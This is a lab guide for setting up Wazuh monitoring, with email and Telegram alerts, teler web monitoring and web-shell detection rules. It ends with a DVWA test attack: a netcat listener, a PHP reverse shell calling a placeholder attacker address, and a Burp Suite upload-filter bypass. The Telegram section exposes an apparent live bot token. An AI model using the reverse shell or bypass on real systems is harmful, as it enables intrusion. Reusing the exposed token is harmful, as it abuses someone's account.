# [Wazuh](https://wazuh.com/)

## Wazuh manager

### Install wazuh

```shell
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && sudo bash ./wazuh-install.sh -a
```

## Wazuh agent

> Note: Instead of all the commands below, I think these commands are preferable, since they were taken from the wazuh dashboard in the deploy new agent page. Also note that the commands differ for different OSes. Instead of any other distribution (like kali), ubuntu is preferable:
> 
> ```shell
> wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.7.2-1_amd64.deb && sudo WAZUH_MANAGER='192.168.1.135' WAZUH_AGENT_GROUP='default' WAZUH_AGENT_NAME='ubuntu_agent' dpkg -i ./wazuh-agent_4.7.2-1_amd64.deb
> ```
> ```shell
> sudo systemctl daemon-reload
> sudo systemctl enable wazuh-agent
> sudo systemctl start wazuh-agent
> ```

### Add wazuh repository

```shell
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg
```

```shell
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee -a /etc/apt/sources.list.d/wazuh.list
```

```shell
apt-get update
```

### Install wazuh agent

```shell
WAZUH_MANAGER="10.0.0.2" apt-get install wazuh-agent
```

### Enable and start wazuh agent

```shell
systemctl daemon-reload
systemctl enable wazuh-agent
systemctl start wazuh-agent
```

# Configure email alerts

### Install the required packages

```shell
apt-get update && apt-get install postfix mailutils libsasl2-2 ca-certificates libsasl2-modules
```

### /etc/postfix/main.cf

```shell
relayhost = [smtp.gmail.com]:587
smtp_sasl_auth_enable = yes
smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd
smtp_sasl_security_options = noanonymous
smtp_tls_CAfile = /etc/ssl/certs/ca-certificates.crt
smtp_use_tls = yes
smtpd_relay_restrictions = permit_mynetworks, permit_sasl_authenticated, defer_unauth_destination
```

### Set the sender email address and password

```shell
echo [smtp.gmail.com]:587 USERNAME@gmail.com:PASSWORD > /etc/postfix/sasl_passwd
postmap /etc/postfix/sasl_passwd
chmod 400 /etc/postfix/sasl_passwd
```

> Note The password must be an [App Password](https://myaccount.google.com/apppasswords). App Passwords can only be used with accounts that have [2-Step Verification](https://myaccount.google.com/signinoptions/two-step-verification) turned on

### Secure your password DB file

```shell
chown root:root /etc/postfix/sasl_passwd /etc/postfix/sasl_passwd.db
chmod 0600 /etc/postfix/sasl_passwd /etc/postfix/sasl_passwd.db
```

### Restart Postfix

```shell
systemctl restart postfix
```

### Test conf

```shell
echo "Test mail from postfix" | mail -s "Test Postfix" -r "you@example.com" you@example.com
```

### /var/ossec/etc/ossec.conf

```xml
<global>
    <!-- ... -->
    <email_notification>yes</email_notification>
    <smtp_server>localhost</smtp_server>
    <email_from>USERNAME@gmail.com</email_from>
    <email_to>you@example.com</email_to>
    <!-- ... -->
</global>

<alerts>
    <log_alert_level>3</log_alert_level>
    <email_alert_level>10</email_alert_level>
</alerts>
```

### Restart the Wazuh manager

```shell
systemctl restart wazuh-manager
```

# Configure telegram bot alerts

### /var/ossec/etc/ossec.conf

```xml
<integration>
    <name>custom-telegram</name>
    <alert_format>json</alert_format>
    <hook_url>https://api.telegram.org/bot6470614628:AAHy_ZBOb4u0fkMKBtGRmTrqLdymPweeS4A/sendMessage</hook_url>
    <max_log>1024</max_log>
    <level>10</level>
</integration>
```

### /var/ossec/integrations/custom-telegram

```py
#!/usr/bin/env python3
import sys, json, requests
from datetime import datetime

url = sys.argv[3]
hostname = '192.168.1.135'
chat_id = '5006697590'

with open(sys.argv[1]) as file:
    alert = json.load(file)

    title = alert['rule']['description']
    description = alert['full_log']
    level = alert['rule']['level']
    rule_id = alert['rule']['id']
    agent_id = alert['agent']['id']
    agent_name = alert['agent']['name']
    timestamp = alert['timestamp']
    date = datetime.strptime(timestamp, '%Y-%m-%dT%H:%M:%S.%f%z').ctime()
    rule_id_url = f'https://{hostname}/app/wazuh#/manager/?tab=rules&redirectRule={rule_id}'
    agent_id_url = f'https://{hostname}/app/wazuh#/agents?tab=welcome&agent={agent_id}'

    message = f'⚠️ *ALERT* ⚠️\n\n'
    message += f'*{title}*\n'
    message += f'_{description}_\n'
    message += f'Level: {level}\n'
    message += f'Rule ID: [{rule_id}]({rule_id_url})\n'
    message += f'Agent: [{agent_name} (ID: {agent_id})]({agent_id_url})\n'
    message += f'Date: {date}\n'

    payload = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'markdown',
    }

    res = requests.get(url, json=payload)

    if res.status_code == 200:
        print('ok')
    else:
        print(f'an error occured while sending message to telegram bot: {res.status_code}, {res.reason}')
```

### Configure permissions

```shell
chmod 750 /var/ossec/integrations/custom-telegram
chown root:wazuh /var/ossec/integrations/custom-telegram
```

# Other

## Enable vulnerability detector

### /var/ossec/etc/ossec.conf

```xml
<vulnerability-detector>
    <enabled>yes</enabled>
    <!-- ... -->
</vulnerability-detector>
```

## File integrity monitoring

### /var/ossec/etc/ossec.conf

```xml
<syscheck>
    <disabled>no</disabled>
    <frequency>43200</frequency>
    <!-- ... -->
    <directories>/etc,/usr/bin,/usr/sbin</directories>
    <!-- ... -->
</syscheck>
```

## Active response (firewall drop)

### /var/ossec/etc/ossec.conf

```xml
<active-response>
    <command>firewall-drop</command>
    <location>local</location>
    <rules_id>5710,2502</rules_id>
    <timeout>180</timeout>
</active-response>
```

# Web monitoring

### Install teler

```shell
wget https://github.com/kitabisa/teler/releases/download/v2.0.0-rc.3/teler_2.0.0-rc.3_linux_amd64.tar.gz
```

```shell
tar -xvzf teler_2.0.0-rc.3_linux_amd64.tar.gz
```

### Download [teler.example.yaml](https://raw.githubusercontent.com/kitabisa/teler/v2/teler.example.yaml)

### and rename it to teler.yaml

```shell
mv teler.example.yaml teler.yaml
```

## Teler configuration on wazuh-agent

### teler.yaml

```yaml
log_format: |
    $remote_addr - $remote_user [$time_local] "$request_method $request_uri $request_protocol" $status $body_bytes_sent "$http_referer" "$http_user_agent"
```

> This log format for Apache2's `/var/log/apache2/access.log` log file:
> 
> `192.168.1.93 - - [20/Feb/2024:21:25:11 +0600] "GET /DVWA/ HTTP/1.1" 302 666 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 YaBrowser/24.1.0.0 Safari/537.36"`

```yaml
logs:
    file:
        active: true 
        json: true 
        path: "/var/log/teler/output.log"
```

### /var/ossec/etc/ossec.conf

```xml
<localfile>
    <log_format>syslog</log_format>
    <location>/var/log/teler/output.log</location>
</localfile>
```

### Restart wazuh-agent

```shell
systemctl restart wazuh-agent
```

### Start teler

```shell
tail -f /var/log/apache2/access.log | ./teler -c ./teler.yaml
```

## On wazuh-manager

### /var/ossec/etc/rules/local_rules.xml

```xml
<group name="teler,">
    <rule id="100012" level="10">
        <decoded_as>json</decoded_as>
        <field name="category" type="pcre2">Common Web Attack(: .*)?|CVE-[0-9]{4}-[0-9]{4,7}</field>
        <field name="request_uri" type="pcre2">\D.+|-</field>
        <field name="remote_addr" type="pcre2">\d+.\d+.\d+.\d+|::1</field>
        <mitre>
            <id>T1210</id>
        </mitre>
        <description>teler detected $(category) against resource $(request_uri) from $(remote_addr)</description>
    </rule>

    <rule id="100013" level="10">
        <decoded_as>json</decoded_as>
        <field name="category" type="pcre2">Bad (IP Address|Referrer|Crawler)</field>
        <field name="request_uri" type="pcre2">\D.+|-</field>
        <field name="remote_addr" type="pcre2">\d+.\d+.\d+.\d+|::1</field>
        <mitre>
            <id>T1590</id>
        </mitre>
        <description>teler detected $(category) against resource $(request_uri) from $(remote_addr)</description>
    </rule>

    <rule id="100014" level="10">
        <decoded_as>json</decoded_as>
        <field name="category" type="pcre2">Directory Bruteforce</field>
        <field name="request_uri" type="pcre2">\D.+|-</field>
        <field name="remote_addr" type="pcre2">\d+.\d+.\d+.\d+|::1</field>
        <mitre>
            <id>T1595</id>
        </mitre>
        <description>teler detected $(category) against resource $(request_uri) from $(remote_addr)</description>
    </rule>
</group>
```

### Restart wazuh-manager

```shell
systemctl restart wazuh-manager
```

## [Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA)

### Automated Installation

```shell
wget https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh
```

```shell
chmod +x Install-DVWA.sh
```

```shell
sudo ./Install-DVWA.sh
```

### Required packages

```shell
apt update
```

```shell
apt install -y apache2 mariadb-server mariadb-client php php-mysqli php-gd libapache2-mod-php
```

### Configuration

```shell
cd DVWA
```

```shell
cp config/config.inc.php.dist config/config.inc.php
```

### Database Setup

Go to `http://<IP_ADDR>/dvwa/` ⏎

Click on the `Setup DVWA` ⏎

Click on the `Create / Reset Database`

### Attack

```shell
nikto -h http://<IP_ADDR>/dvwa/
```

## Monitor Nuxt.js

### server\middleware\log.js

```js
import { appendFile } from 'fs';

export default defineEventHandler(async (event) => {
    const request = `${event.method} ${event.path}`;
    const status = getResponseStatus(event);
    const userAgent = event.headers.get('user-agent');
    const formattedLog = `"${request} ${status}" - "${userAgent}"`;
    const logMessage = `[${new Date().toISOString()}] ${formattedLog}\n`;

    appendFile('./output.log', logMessage, (err) => {
        if (err) console.error('Error: ', err);
        console.log(logMessage);
    });
});
```

```shell
npm run build
npm run preview
```

### teler.yaml on wazuh-agent

```yaml
log_format: |
  [$time_local] "$request_method $request_uri $status" - "$http_user_agent"
```

### Restart wazuh-agent

```shell
systemctl restart wazuh-agent
```

### /var/ossec/etc/rules/local_rules.xml on wazuh-manager

```xml
<group name="teler,">
    <rule id="100012" level="10">
        <decoded_as>json</decoded_as>
        <field name="category" type="pcre2">Common Web Attack(: .*)?|CVE-[0-9]{4}-[0-9]{4,7}</field>
        <field name="request_uri" type="pcre2">\D.+|-</field>
        <description>teler detected $(category) against resource $(request_uri)</description>
    </rule>

    <rule id="100013" level="10">
        <decoded_as>json</decoded_as>
        <field name="category" type="pcre2">Bad (Crawler)</field>
        <field name="request_uri" type="pcre2">\D.+|-</field>
        <description>teler detected $(category) against resource $(request_uri)</description>
    </rule>

    <rule id="100014" level="10">
        <decoded_as>json</decoded_as>
        <field name="category" type="pcre2">Directory Bruteforce</field>
        <field name="request_uri" type="pcre2">\D.+|-</field>
        <description>teler detected $(category) against resource $(request_uri)</description>
    </rule>
</group>
```

### Restart wazuh-manager

```shell
systemctl restart wazuh-manager
```

### Start teler

```shell
tail -f ../Nuxt.js/.output/output.log | ./teler -c ./teler.yaml
```

## Monitor directories for detection of web shells

### /var/ossec/etc/ossec.conf

```xml
<syscheck>
    <!-- ... -->
    <directories realtime="yes" check_all="yes" report_changes="yes">/var/www/html</directories>
    <!-- ... -->
</syscheck>
```

### Restart wazuh-agent

```shell
systemctl restart wazuh-agent
```

### /var/ossec/etc/rules/webshell_rules.xml

```xml
<group name="linux, webshell, windows,">
    <rule id="100500" level="12">
        <if_sid>554</if_sid>
        <field name="file" type="pcre2">(?i).php$|.phtml$|.php3$|.php4$|.php5$|.phps$|.phar$|.asp$|.aspx$|.jsp$|.cshtml$|.vbhtml$</field>
        <description>[File creation]: Possible web shell scripting file ($(file)) created</description>
        <mitre>
            <id>T1105</id>
            <id>T1505</id>
        </mitre>
    </rule>
    <rule id="100501" level="12">
        <if_sid>550</if_sid>
        <field name="file" type="pcre2">(?i).php$|.phtml$|.php3$|.php4$|.php5$|.phps$|.phar$|.asp$|.aspx$|.jsp$|.cshtml$|.vbhtml$</field>
        <description>[File modification]: Possible web shell content added in $(file)</description>
        <mitre>
            <id>T1105</id>
            <id>T1505</id>
        </mitre>
    </rule>
    <rule id="100502" level="15">
        <if_sid>100501</if_sid>
        <field name="changed_content" type="pcre2">(?i)passthru|exec|eval|shell_exec|assert|str_rot13|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|show_source|proc_open|pcntl_exec|execute|WScript.Shell|WScript.Network|FileSystemObject|Adodb.stream</field>
        <description>[File Modification]: File $(file) contains a web shell</description>
        <mitre>
            <id>T1105</id>
            <id>T1505.003</id>
        </mitre>
    </rule>
</group>
```

### Restart wazuh-manager

```shell
systemctl restart wazuh-manager
```

### Start netcat on attacker's machine

```shell
nc -nvlp 4444
```

### shell.php.jpg

```php
<?php
    $sock = fsockopen('<ATCKR-ADDR>', 4444);
    exec("/bin/bash -i <&3 >&3 2>&3");
?>
```

### Uploading file

Enable `intercept` on `Burp Suite`

Upload `shell.php.jpg` on `http://<IP_ADDR>/DVWA/vulnerabilities/upload/`

Modify `filename="shell.php.jpg"` to `filename="shell.php"`

Click `Forward`

Go to `http://<IP_ADDR>/DVWA/hackable/uploads/shell.php`